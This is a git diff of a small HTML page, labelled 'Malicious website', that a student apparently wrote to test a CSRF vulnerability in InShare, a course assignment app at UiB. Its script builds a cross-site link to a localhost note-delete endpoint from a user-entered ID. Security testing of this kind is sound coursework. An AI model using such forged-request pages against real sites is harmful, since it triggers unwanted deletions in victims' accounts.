@@ -1,25 +1,47 @@
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="styles.css" />
     <title>Document</title>
   </head>
   <body>
-    <h1>MALICIOUS</h1>
-    <div>
-      <p>
+    <div class="container">
+      <h1>Malicious website!!</h1>
+      <p class="text">
         This is a site made for testing the presence of CSRF-vulnerability in
         InShare.
       </p>
-      <p>
+      <p class="text">
         InShare is an application made for an obligatory assignment in the
         course INF226 at UiB.
       </p>
-      <a
-        href="http://localhost:8080/note/delete/0193204c-c441-7364-8708-d70a9cdbe4ca"
-      >
-        <div>TEST CSRF-vulnerability by clicking this</div></a
-      >
+
+      <!-- Input for Note ID -->
+      <input
+        type="text"
+        name="Note id"
+        id="noteid"
+        class="input"
+        placeholder="Enter Note ID"
+      />
+
+      <!-- Button to trigger the CSRF action -->
+      <a id="csrf-link" href="#" class="button-link">
+        <div>TEST CSRF-vulnerability by clicking this</div>
+      </a>
     </div>
+
+    <script>
+      document.getElementById("csrf-link").onclick = function () {
+        var noteID = document.getElementById("noteid").value;
+        if (noteID) {
+          this.href = "http://localhost:8080/note/delete/" + noteID;
+        } else {
+          alert("Please enter a Note ID before proceeding.");
+        }
+      };
+    </script>
   </body>
 </html>
